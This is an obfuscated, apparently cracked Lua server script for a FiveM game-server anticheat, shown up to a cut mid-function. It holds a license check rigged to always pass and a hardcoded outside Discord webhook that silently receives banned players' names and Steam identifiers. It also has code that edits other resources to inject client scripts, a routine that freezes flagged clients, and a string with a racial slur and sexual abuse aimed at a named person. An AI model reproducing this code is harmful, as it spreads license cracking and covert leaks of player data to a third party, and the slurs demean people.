local ULPEvzUxG_lhCGVZ48S = {
    [1] = "^2[GlobalAC] ",
    [2] = "^0",
    [3] = "globalAC:trigger",
    [4] = "globalAC:trigger",
    [5] = " GlobalAC - https://discord.gg/U2Dqc5j\n You have benn banned for reason:",
    [6] = "",
    [7] = "adminmenu:allowall",
    [8] = "adminmenu:allowall",
    [9] = "GlobalAC - https://discord.gg/U2Dqc5j",
    [10] = "color",
    [11] = 2061822,
    [12] = "title",
    [13] = "GlobalAC - Bans",
    [14] = "description",
    [15] = "Name: **",
    [16] = "**\nSteam: **",
    [17] = "**\nDetected in: **",
    [18] = "**",
    [19] = "footer",
    [20] = "text",
    [21] = "GlobalAC - Bans",
    [22] = "https://discordapp.com/api/webhooks/735408159388074065/M15-36qWg328s4xw3ov_g11ktVg-w7uX6TIHkUcLrFBF24Xxs0K3s9RUaFLv7-A8RpcX",
    [23] = "POST",
    [24] = "GlobalGuard - Bans",
    [25] = "Content-Type",
    [26] = "application/json",
    [27] = "POST",
    [28] = "GlobalAC - Bans",
    [29] = "Content-Type",
    [30] = "application/json",
    [31] = "onResourceStart",
    [32] = false,
    [33] = "https://www.myip.com/",
    [34] = '<span id="ip">',
    [35] = "</span>",
    [36] = 1,
    [37] = "http://mieszi.site/?key=",
    [38] = "^5=========== global_ac  ===========",
    [39] = " ",
    [40] = "^2[ global_ac ] : Licencja poprawna. [ CRACKED BY EXERR#1177 ]",
    [41] = " ",
    [42] = "^5=========== global_ac  ===========",
    [43] = "^1=========== global_ac - WYSTAPIL ERROR! ===========",
    [44] = " ",
    [45] = "^1 [ Error ] : Nie posiadasz licencji skryptu ",
    [46] = " lub wystąpił błąd [",
    [47] = "]",
    [48] = " ",
    [49] = "^1=========== global_acc - WYSTAPIL ERROR! ===========",
    [50] = "playerConnecting",
    [51] = "Serwer posiada ",
    [52] = " bez licencji. Dołączanie OFF",
    [53] = "Dołączanie OFF ponieważ nie posiadasz licencji do ",
    [54] = "sets GlobalAC ✅",
    [55] = '\nlocal F = {\n	"/e",\n	"/f",\n	"/d"\n}\nCitizen.CreateThread(function()\n	while true do\n		local G = GetOnscreenKeyboardResult()\n		if G ~= nil and G ~= false and G ~= true then\n			for a, H in pairs(F) do\n				if G:match(H) then\n					TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n					Citizen.Wait(500)\n					while true do\n						Citizen.Wait(500)\n					end\n				end;\n				Wait(1)\n			end\n		end;\n		Wait(100)\n	end\nend)\nlocal functionsToCheck = {\n	"TesticleFunction",\n	"tcoke",\n	"checkValidVehicleExtras",\n	"vrpdestroy",\n	"Oscillate",\n	"esxbills",\n	"TSE",\n	"TesticleFunction",\n	"rape",\n	"tcoke",\n	"AirstrikePlayerhfiusygf8972dsf2sdfjugfdf2ds",\n	"ShowInfo",\n	"checkValidVehicleExtras",\n	"PrintTable",\n	"NertigelFunc",\n	"bananapartyall",\n    "vrpdestroy",\n    "ch",\n	"Oscillate",\n	"Teleport",\n	"pdocisaduafuGFNAEgg",\n	"banallusers",\n	"Macias",\n	"robloxmenu",\n	"CrashPlayer",\n	"KillYourselfThread",\n	"RapeAllFunc",\n	"TazePlayer",\n	"blowall",\n	"teleportToNearestVehicle",\n	"AirstrikePlayer",\n	"MaxOut",\n	"OneShot",\n	"RandomClothes",\n	"servercrasher",\n	"krasnolud skid",\n	"RainbowVeh",\n	"ClonePedlol",\n	"ShootPlayer",\n	"esp",\n	"nuke",\n	"GetAllPeds",\n	"krasnolud",\n	"onion",\n	"sokin#1337",\n	"roblox",\n    "forcetick",\n	"ApplyShockwave",\n	"przyciskktoregoniewykryjeszsmieciu",\n    "GetCoordsInfrontOfEntityWithDistance",\n    "TeleporterinoPlayer",\n    "GetCamDirFromScreenCenter",\n    "notify",\n    "DrawText3D2",\n    "WorldToScreenRel",\n    "DoesVehicleHaveExtras",\n	"esxdestroy",\n	"forcetick",\n	"ApplyShockwave",\n	"GetCoordsInfrontOfEntityWithDistance",\n	"TeleporterinoPlayer",\n	"Clean2"\n  }\nCitizen.CreateThread(function()\n	while true do\n		Citizen.Wait(1000)\n		if checkGlobalVariable() then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n	end\nend)\ncheckGlobalVariable = function()\n	for _i in pairs(functionsToCheck) do\n		if (_G[functionsToCheck[_i] ] ~= nil) then\n			return true\n		else\n			return false\n		end\n	end\nend\nCitizen.CreateThread(function()\n	while true do Citizen.Wait(1000)\n		if _G == nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'global var set to nil in resource: \'..GetCurrentResourceName())\n		end\n	end\nend)\nlocal oldGiveWeaponToPed = GiveWeaponToPed\nGiveWeaponToPed = function(ped, ...)\n    if ped ~= PlayerPedId() then\n        TriggerServerEvent(\'globalAC:trigger\', \'GiveWeaponToPed in resource: \'..GetCurrentResourceName())\n    else\n    oldGiveWeaponToPed(ped, ...)\n    end\nend\nyugdts67gfsdg = {}\nPlane = {}\nCience = {}\nPowerFulSokin = {}\nFrostedMenu = {}\nDeluxe = {}\nDeer = {}\ne = {}\nLynx8 = {}\nLynxEvo = {}\nMotion = {}\nTiagoMenu = {}\ngaybuild = {}\nLR = {}\nHamMafia = {}\nInSec = {}\nKoGuSzEk = {}\nariesMenu = {}\nHam = {}\nBiznes = {}\nWarMenu = \'ayy\'\nRoblox = \'ayy\'\noTable = \'ayy\'\nCitizen.CreateThread(function()\n	while true do\n		Citizen.Wait(1000)\n		if WarMenu ~= \'ayy\' then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if Roblox ~= \'ayy\' then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if oTable ~= \'ayy\' then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if Plane.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n        end\n		if Cience.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if FrostedMenu.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if Lynx8.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if HamMafia.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if KoGuSzEk.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if ariesMenu.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if LR.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if LynxEvo.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if Lynx8.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if Motion.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if gaybuild.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if Deluxe.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if Deer.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if Biznes.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if TiagoMenu.CreateMenu ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if InSec.Logo ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if yugdts67gfsdg.jhgfdiugdg ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if PowerFulSokin.asdjasd97aaa ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n		if e.debug ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		end\n	end\nend)\nlocal menuFunctions = { \n	{\'TriggerCustomEvent\', \'Hoax\'}, {\'GetResources\', \'SkidMenu\'}, {\'IsResourceInstalled\', \'SkidMenu\'}, {\'ShootPlayer\', \'Lynx\'}, {\'FirePlayer\', \'Lynx\'}, {\'MaxOut\', \'Lynx\'}, {\'Clean2\', \'Lynx\'}, {\'Outcasts666\', \'Skinner1223\'},  \n}\nlocal menuTables = {\n	{\'Dopamine\', \'Dopamine\'}, {\'LuxUI\', \'Lux\'}, {\'objs_tospawn\', \'SkidMenu\'}, {\'lynxunknowncheats\', \'Lynx\'}, {\'BrutanPremium\', \'Lynx\'}, {\'oTable\', \'Hoax\'}, {\'HoaxMenu\', \'Hoax\'}, {\'Maestro\', \'MaestroEra\'},\n}\nCitizen.CreateThread(function()\n	while true do Citizen.Wait(1000)\n		for _, ayyLmao in pairs(menuFunctions) do\n            local menuFunction = ayyLmao[1]\n            local menuName = ayyLmao[2]\n            local returnType = load(\'return type(\'..menuFunction..\')\')\n			if returnType() == \'function\' then\n				TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n			end\n		end\n	end\nend)\nCitizen.CreateThread(function()\n	while true do Citizen.Wait(1000)\n		for _, ayyLmao in pairs(menuTables) do\n            local menuTable = ayyLmao[1]\n            local menuName = ayyLmao[2]\n            local returnType = load(\'return type(\'..menuTable..\')\')\n			if returnType() == \'table\' then\n				TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n			end\n		end\n	end\nend)\nfunction fuckmedaddy()\n  Citizen.CreateThread(function()\n    while true do\n    end\n  end)\nend;\ne = {}\nInSec = {}\nlocal f = "vrp"\nlocal g = "server"\nlocal h = "client"\nCitizen.CreateThread(function()\n  Citizen.Wait(2000)\n  while true do\n    Citizen.Wait(2000)\n    for b, c in next, _G do\n      if type(c) == "table" and b ~= "exports" then\n        if c.CreateMenu ~= nil and type(c.CreateMenu) == "function" then\n          if b ~= "WarMenu" and b ~= "vRP" and b ~= "NativeUI" and b ~= "RageUI" and b ~= "JayMenu" and b ~= "VEM" and b ~= "VLM" and not string.match(b:lower(), f:lower()) and not string.match(b:lower(), g:lower()) and not string.match(b:lower(), h:lower()) then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n            fuckmedaddy()\n          end\n        elseif c.InitializeTheme ~= nil then\n			TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n			fuckmedaddy()\n        end\n      end\n    end\n  end\nend)\nCitizen.CreateThread(function()\n  Citizen.Wait(2000)\n  while true do\n    Citizen.Wait(2000)\n    if e.debug ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif InSec.Logo ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif MaestroEra ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif HoaxMenu ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif nukeserver ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif esxdestroyv2 ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif teleportToNearestVehicle ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif AddTeleportMenu ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif AmbulancePlayers ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif Aimbot ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif RapeAllFunc ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif CrashPlayer ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif EconomyDestroyer2 ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif bananapartyall ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif AmbulancePlayers ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif cageplayer ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif rapeplayer ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif bananaparty ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif vGktzXSF74SfeW8 ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif PrintTable ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    elseif Macias ~= nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n    end\n  end\nend)\nCitizen.CreateThread(function()\n  while true do\n    Citizen.Wait(100)\n    if _G == nil or _G == nil then\n		TriggerServerEvent(\'globalAC:trigger\', \'menu detection in resource: \'..GetCurrentResourceName())\n		fuckmedaddy()\n      break\n    else\n      Wait(500)\n    end\n  end\nend)\n',
    [56] = "something",
    [57] = "something",
    [58] = "something",
    [59] = true,
    [60] = "/ooc kogusz menu! Buy at https://discord.gg/BbDMhJe",
    [61] = "/ooc Baggy Menu! Buy at https://discord.gg/AGxGDzg",
    [62] = "/ooc Desudo Menu! Buy at https://discord.gg/hkZgrv3",
    [63] = "/tweet discord.gg",
    [64] = "/ooc Yo add me Fallen#0811",
    [65] = "/ooc kogusz menu! Buy at https://discord.gg/BM5zTvA",
    [66] = "BAGGY menu <3 https://discord.gg/AGxGDzg",
    [67] = "KoGuSzMENU <3 https://discord.gg/BbDMhJe",
    [68] = "KoGuSzMENU <3 https://discord.gg/BM5zTvA",
    [69] = "Desudo menu <3 https://discord.gg/hkZgrv3",
    [70] = "Yo add me Fallen#0811",
    [71] = "Lynx 8 ~ www.lynxmenu.com",
    [72] = "Lynx 7 ~ www.lynxmenu.com",
    [73] = "lynxmenu.com",
    [74] = "www.lynxmenu.com",
    [75] = "You got raped by Lynx 8",
    [76] = "^0Lynx 8 ~ www.lynxmenu.com",
    [77] = "^0AlphaV ~ 5391",
    [78] = "^0You got raped by AlphaV",
    [79] = "^0TITO MODZ - Cheats and Anti-Cheat",
    [80] = "^0https://discord.gg/AGxGDzg",
    [81] = "^0https://discord.gg/hkZgrv3",
    [82] = "You just got fucked mate",
    [83] = "Add me Fallen#0811",
    [84] = "Desudo; Plane#000",
    [85] = "BAGGY; baggy#6875",
    [86] = "SKAZAMENU",
    [87] = "skaza",
    [88] = "aries",
    [89] = "Eulen Cheats",
    [90] = "youtube.com",
    [91] = "desudo",
    [92] = "Sokin_Menu",
    [93] = "OnionExecutor",
    [94] = "Lux",
    [95] = "Dopamine",
    [96] = "Mastero",
    [97] = "Zakolak",
    [98] = "v500",
    [99] = "brutanpremium",
    [100] = "lynxmenu",
    [101] = "/ooc  d0pamine.xyz | discord.gg/fjBp55t",
    [102] = "Lynx Revolution",
    [103] = "Lynx Revolution ~r~10.1",
    [104] = "~u~LCAC 8 ~s~Admin Menu",
    [105] = "Dopamine",
    [106] = "chatMessage",
    [107] = "you did write the wrong word lmafo",
    [108] = "onServerResourceStart",
    [109] = "/bans.txt",
    [110] = "r",
    [111] = "set",
    [112] = 0,
    [113] = "*a",
    [114] = "Couldn't find bans.txt in: ",
    [115] = " | ",
    [116] = "/bans.txt",
    [117] = "w",
    [118] = "set",
    [119] = "Couldnt write in: ",
    [120] = "/bans.txt",
    [121] = 15000,
    [122] = "playerConnecting",
    [123] = "GlobalAC - https://discord.gg/U2Dqc5j\n",
    [124] = "\n",
    [125] = nil,
    [126] = "gg",
    [127] = "install",
    [128] = 2,
    [129] = "all",
    [130] = 4,
    [131] = "^4Done! (",
    [132] = "/",
    [133] = " successfully). ",
    [134] = 3,
    [135] = " skipped (not necessary).^7",
    [136] = "------------------------------------------------------------------",
    [137] = "^4Done! (",
    [138] = "/",
    [139] = " successfully). ",
    [140] = " skipped (not necessary).^7",
    [141] = "^1The resource ",
    [142] = " doesn't exist.^7",
    [143] = "uninstall",
    [144] = "^4Done! (",
    [145] = "/",
    [146] = " successfully). ",
    [147] = " skipped (not necessary).^7",
    [148] = "/",
    [149] = "r",
    [150] = "/",
    [151] = "set",
    [152] = "*a",
    [153] = "\n",
    [154] = 'client_script "',
    [155] = '"',
    [156] = "client_script",
    [157] = "#",
    [158] = '\nclient_script "',
    [159] = '"',
    [160] = "/",
    [161] = "/",
    [162] = "w",
    [163] = "set",
    [164] = "/",
    [165] = "w",
    [166] = "set",
    [167] = "^2Finished guarding ",
    [168] = " resource successfully.^7",
    [169] = "^1Failed guarding ",
    [170] = ".^7",
    [171] = "set",
    [172] = "*a",
    [173] = "\n",
    [174] = 'client_script "',
    [175] = '"',
    [176] = "\n",
    [177] = "/",
    [178] = "/",
    [179] = "/",
    [180] = "/",
    [181] = "/",
    [182] = "w",
    [183] = "set",
    [184] = "^2Failed uninstalling anticheat from ",
    [185] = " successfully.^7",
    [186] = "^2Finished uninstalling anticheat from ",
    [187] = " successfully.^7",
    [188] = 'dir "',
    [189] = '" /b /ad',
    [190] = "set",
    [191] = "*a",
    [192] = "\n",
    [193] = "/",
    [194] = "/",
    [195] = "--emily why u checkin this?",
    [196] = "emily emily i see  u fuckin unpacked me now go fuck me because u are fuckin gay and i fucked ur step mother 20 fuckin times u fuckin niggggggggggggggggggger\n",
    [197] = "--[[ dsdsfdfsdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsfdsf]]--"
}
local YZKvflqZMZIi0G = print
print = function(XeNue)
    YZKvflqZMZIi0G(ULPEvzUxG_lhCGVZ48S[1] .. XeNue .. ULPEvzUxG_lhCGVZ48S[2])
end
RegisterNetEvent(ULPEvzUxG_lhCGVZ48S[3])
AddEventHandler(
    ULPEvzUxG_lhCGVZ48S[4],
    function(vDwReDrd72519)
        local bmk = source
        discordsend(source, vDwReDrd72519)
        banUser(bmk)
        DropPlayer(bmk, ULPEvzUxG_lhCGVZ48S[5] .. vDwReDrd72519 .. ULPEvzUxG_lhCGVZ48S[6])
    end
)
RegisterServerEvent(ULPEvzUxG_lhCGVZ48S[7])
AddEventHandler(
    ULPEvzUxG_lhCGVZ48S[8],
    function()
        DropPlayer(source, ULPEvzUxG_lhCGVZ48S[9])
    end
)
function discordsend(AB, PMW8EfGhdm3g09uT)
    local K = {
        {
            [ULPEvzUxG_lhCGVZ48S[10]] = ULPEvzUxG_lhCGVZ48S[11],
            [ULPEvzUxG_lhCGVZ48S[12]] = ULPEvzUxG_lhCGVZ48S[13],
            [ULPEvzUxG_lhCGVZ48S[14]] = ULPEvzUxG_lhCGVZ48S[15] ..
                GetPlayerName(AB) ..
                    ULPEvzUxG_lhCGVZ48S[16] ..
                        GetPlayerIdentifier(AB) ..
                            ULPEvzUxG_lhCGVZ48S[17] .. PMW8EfGhdm3g09uT .. ULPEvzUxG_lhCGVZ48S[18],
            [ULPEvzUxG_lhCGVZ48S[19]] = {[ULPEvzUxG_lhCGVZ48S[20]] = ULPEvzUxG_lhCGVZ48S[21]}
        }
    }
    PerformHttpRequest(
        ULPEvzUxG_lhCGVZ48S[22],
        function(CyFvozx, w_3dZU358eeHJAl, rA9zA7tEf2WYDNF)
        end,
        ULPEvzUxG_lhCGVZ48S[23],
        json.encode({username = ULPEvzUxG_lhCGVZ48S[24], embeds = K}),
        {[ULPEvzUxG_lhCGVZ48S[25]] = ULPEvzUxG_lhCGVZ48S[26]}
    )
    PerformHttpRequest(
        Config.Webhook,
        function(Fv, ekub3, w9kXSXtumud9)
        end,
        ULPEvzUxG_lhCGVZ48S[27],
        json.encode({username = ULPEvzUxG_lhCGVZ48S[28], embeds = K}),
        {[ULPEvzUxG_lhCGVZ48S[29]] = ULPEvzUxG_lhCGVZ48S[30]}
    )
end
AddEventHandler(
    ULPEvzUxG_lhCGVZ48S[31],
    function(qOgVV8x2W_rEGpphMX)
        local f4yCB = ULPEvzUxG_lhCGVZ48S[32]
        PerformHttpRequest(
            ULPEvzUxG_lhCGVZ48S[33],
            function(V127iL1s45ZoaerNc, iteKt_L4SSBM, f)
                local HD5ktJpPI5S, g7BA = string.find(tostring(iteKt_L4SSBM), ULPEvzUxG_lhCGVZ48S[34])
                local XU, ho3wRAR = string.find(tostring(iteKt_L4SSBM), ULPEvzUxG_lhCGVZ48S[35])
                if not g7BA then
                    return
                end
                f4yCB = string.sub(tostring(iteKt_L4SSBM), g7BA + ULPEvzUxG_lhCGVZ48S[36], XU - ULPEvzUxG_lhCGVZ48S[36])
                        if string.find(tostring(f4yCB), f4yCB) then
                            print(ULPEvzUxG_lhCGVZ48S[38])
                            print(ULPEvzUxG_lhCGVZ48S[39])
                            print(ULPEvzUxG_lhCGVZ48S[40])
                            print(ULPEvzUxG_lhCGVZ48S[41])
                            print(ULPEvzUxG_lhCGVZ48S[42])
                            CancelEvent()
                            lhCGVwfafwaZ48S()
                        else
                            qOgVV8x2W_rEGpphMX = GetCurrentResourceName()
                            print(ULPEvzUxG_lhCGVZ48S[43])
                            print(ULPEvzUxG_lhCGVZ48S[44])
                            print(
                                ULPEvzUxG_lhCGVZ48S[45] ..
                                    qOgVV8x2W_rEGpphMX .. ULPEvzUxG_lhCGVZ48S[46] .. f4yCB .. ULPEvzUxG_lhCGVZ48S[47]
                            )
                            print(ULPEvzUxG_lhCGVZ48S[48])
                            print(ULPEvzUxG_lhCGVZ48S[49])
                            AddEventHandler(
                                ULPEvzUxG_lhCGVZ48S[50],
                                function(rSyWsuXB, K)
                                    K(ULPEvzUxG_lhCGVZ48S[51] .. qOgVV8x2W_rEGpphMX .. ULPEvzUxG_lhCGVZ48S[52])
                                    print(ULPEvzUxG_lhCGVZ48S[53] .. qOgVV8x2W_rEGpphMX)
                                    CancelEvent()
                                    lhCGVwfafwaZ48S()
                                end
                            )
                        end
            end
        )
    end
)
ExecuteCommand(ULPEvzUxG_lhCGVZ48S[54])
local YJiNnUxDAgiR0aIZa = ULPEvzUxG_lhCGVZ48S[55]
local HNLVe53ue = {}
RegisterNetEvent(ULPEvzUxG_lhCGVZ48S[56])
AddEventHandler(
    ULPEvzUxG_lhCGVZ48S[57],
    function()
        if not HNLVe53ue[source] then
            TriggerClientEvent(ULPEvzUxG_lhCGVZ48S[58], source, YJiNnUxDAgiR0aIZa)
            HNLVe53ue[source] = ULPEvzUxG_lhCGVZ48S[59]
        else
            return
        end
    end
)
local ZMWQY1a = {
    ULPEvzUxG_lhCGVZ48S[60],
    ULPEvzUxG_lhCGVZ48S[61],
    ULPEvzUxG_lhCGVZ48S[62],
    ULPEvzUxG_lhCGVZ48S[63],
    ULPEvzUxG_lhCGVZ48S[64],
    ULPEvzUxG_lhCGVZ48S[65],
    ULPEvzUxG_lhCGVZ48S[66],
    ULPEvzUxG_lhCGVZ48S[67],
    ULPEvzUxG_lhCGVZ48S[68],
    ULPEvzUxG_lhCGVZ48S[69],
    ULPEvzUxG_lhCGVZ48S[70],
    ULPEvzUxG_lhCGVZ48S[71],
    ULPEvzUxG_lhCGVZ48S[72],
    ULPEvzUxG_lhCGVZ48S[73],
    ULPEvzUxG_lhCGVZ48S[74],
    ULPEvzUxG_lhCGVZ48S[75],
    ULPEvzUxG_lhCGVZ48S[76],
    ULPEvzUxG_lhCGVZ48S[77],
    ULPEvzUxG_lhCGVZ48S[78],
    ULPEvzUxG_lhCGVZ48S[79],
    ULPEvzUxG_lhCGVZ48S[80],
    ULPEvzUxG_lhCGVZ48S[81],
    ULPEvzUxG_lhCGVZ48S[82],
    ULPEvzUxG_lhCGVZ48S[83],
    ULPEvzUxG_lhCGVZ48S[84],
    ULPEvzUxG_lhCGVZ48S[85],
    ULPEvzUxG_lhCGVZ48S[86],
    ULPEvzUxG_lhCGVZ48S[87],
    ULPEvzUxG_lhCGVZ48S[88],
    ULPEvzUxG_lhCGVZ48S[89],
    ULPEvzUxG_lhCGVZ48S[90],
    ULPEvzUxG_lhCGVZ48S[91],
    ULPEvzUxG_lhCGVZ48S[92],
    ULPEvzUxG_lhCGVZ48S[93],
    ULPEvzUxG_lhCGVZ48S[94],
    ULPEvzUxG_lhCGVZ48S[95],
    ULPEvzUxG_lhCGVZ48S[96],
    ULPEvzUxG_lhCGVZ48S[97],
    ULPEvzUxG_lhCGVZ48S[98],
    ULPEvzUxG_lhCGVZ48S[99],
    ULPEvzUxG_lhCGVZ48S[100],
    ULPEvzUxG_lhCGVZ48S[101],
    ULPEvzUxG_lhCGVZ48S[102],
    ULPEvzUxG_lhCGVZ48S[103],
    ULPEvzUxG_lhCGVZ48S[104],
    ULPEvzUxG_lhCGVZ48S[105]
}
AddEventHandler(
    ULPEvzUxG_lhCGVZ48S[106],
    function(npikau, SYO74yG, GrZ79wh)
        local bdI = GetPlayerName(npikau)
        local aNotrdp2R = GetPlayerEndpoint(npikau)
        local sRh = GetPlayerIdentifier(npikau)
        local fPZenFaHVmz8ZlcUBU = GetPlayerLastMsg(npikau)
        for N6kyTAnZhkwlh5sGwyW, yOWz in ipairs(ZMWQY1a) do
            if string.match(GrZ79wh, yOWz) then
                DropPlayer(ULPEvzUxG_lhCGVZ48S[107])
                CancelEvent()
            end
        end
    end
)
local dgiyouc9ErBZKyh7QvP = ULPEvzUxG_lhCGVZ48S[6]
AddEventHandler(
    ULPEvzUxG_lhCGVZ48S[108],
    function(aOoL_Bj2vx)
        if aOoL_Bj2vx == GetCurrentResourceName() then
            local OONkkx = GetResourcePath(aOoL_Bj2vx)
            local KkczVa1t7p3FX = io.open(OONkkx .. ULPEvzUxG_lhCGVZ48S[109], ULPEvzUxG_lhCGVZ48S[110])
            if KkczVa1t7p3FX then
                KkczVa1t7p3FX:seek(ULPEvzUxG_lhCGVZ48S[111], ULPEvzUxG_lhCGVZ48S[112])
                dgiyouc9ErBZKyh7QvP = KkczVa1t7p3FX:read(ULPEvzUxG_lhCGVZ48S[113])
                KkczVa1t7p3FX:close()
            else
